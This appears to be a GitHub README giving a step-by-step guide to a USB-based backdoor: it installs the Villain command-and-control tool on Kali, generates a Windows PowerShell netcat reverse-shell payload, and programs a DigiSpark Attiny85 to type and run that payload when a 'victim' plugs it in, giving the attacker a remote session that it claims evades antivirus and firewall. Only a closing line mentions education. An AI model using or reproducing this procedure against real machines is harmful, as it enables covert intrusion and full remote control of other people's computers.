# Network-Security

# Requirements:
•	 Kali Linux (attacker’s machine) <br>
•	 Windows 11 (victim’s machine) <br>
•	 Villain Tool on Kali Linux <br>
•	 DigiSpark Attiny85 <br>
•	 Arduino IDE <br>

# Installing Villain Tool
Install the latest version of Villain manually:
```
sudo git clone https://github.com/t3l3machus/Villain.git
```
![1](https://github.com/mishqatabid/Network-Security/assets/145700715/09fc9dac-f0db-40b0-a0f4-40429e2849f9)

Install the `requirements.txt` 
```
cd ./Villain
pip3 install -r requirements.txt
```
![2](https://github.com/mishqatabid/Network-Security/assets/145700715/bf6b1320-018e-4696-9bfa-531802b8824a)

You should also install `gnome-terminal` (required for one of the framework's commands):
```
sudo apt update&&sudo apt install gnome-terminal
```

![3](https://github.com/mishqatabid/Network-Security/assets/145700715/193d2fe2-69b8-4d75-bb41-f9f8c4a05611)

Now it is ready to use<br>

![4](https://github.com/mishqatabid/Network-Security/assets/145700715/58e48912-81fa-4e9f-9c00-8142a1c0b8ec)<br>

# Generate & Test Payload
## Generating Payload
As Villain tool is operating, we will use it to generate to generate the required payload for our backdoor. <br>
To generate the payload, write the keyword generate, specify the type of payload you want to generate, then specify the local host and click enter to get the desired payload
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 
```
![5](https://github.com/mishqatabid/Network-Security/assets/145700715/9ce703b6-b38c-490d-95fb-2053b6abdf96)

## Testing Payload
•	 The payload is generated and it’s time to test the payload. <br>
•	 For testing we are using Windows 11<br>
•	 Open the PowerShell, paste the payload on shell and click enter <br>
•	 You can witness that the payload is running successfully and have bypassed the Windows Antivurus and Firewall

![8](https://github.com/mishqatabid/Network-Security/assets/145700715/0cdfab1e-1864-4f2a-88b6-769287d7126c)

# Deploying Payload
•	 To deploy the payload, we will download the [Arduino IDE](https://www.arduino.cc/en/software)<br>
•	 Open the IDE, create a new sketch file and write down the code for Digispark Attiny85.<br> 
•	 The [Sketch](https://github.com/mishqatabid/Network-Security/blob/main/sketch.ino) is then compiled and uploaded on Arduino present in Digispark Attiny85<br>

![9](https://github.com/mishqatabid/Network-Security/assets/145700715/72708055-3aa5-4420-997f-4c04f5cfc400)

# Backdoor
•	 Now when the victim inject the Attiny85 in its machine. <br>
•	 After few seconds, search bar is opens and PowerShell is searched
•	 It opens the PowerShell, then automatically pastes the payload and click enter to execute it.
•	 Once the script is executed you can witness that a backdoor session has been established on the Villain terminal on attacker’s machine.

![1](https://github.com/mishqatabid/Network-Security/assets/145700715/14a21b81-32fb-4aea-a391-cf8f05fcc434)

•	 Now by typing sessions on the Villain terminal, you can see all the possible session that has been established using the payload.
•	 It contains `Session ID`, `IP Address`, `OS Type`, `User`, `Owner` and `Status`.
![2](https://github.com/mishqatabid/Network-Security/assets/145700715/2e9c453d-733a-4f26-a2a0-6d2f5fb5daeb)
![3](https://github.com/mishqatabid/Network-Security/assets/145700715/5573c2c2-8853-424c-8717-e8e0e623f528)

Now the backdoor has been created, you can easily execute any command

# Use this for Education Purpose ONLY
